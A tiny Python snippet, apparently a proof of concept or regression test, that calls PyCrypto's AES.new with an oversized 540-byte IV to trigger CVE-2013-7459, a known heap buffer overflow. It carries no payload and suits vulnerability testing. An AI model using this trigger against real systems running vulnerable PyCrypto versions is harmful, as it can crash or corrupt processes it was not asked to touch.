from Crypto.Cipher import AES

# CVE-2013-7459
AES.new(b'\\000' * 16, AES.MODE_ECB, b'\\000' * 540)
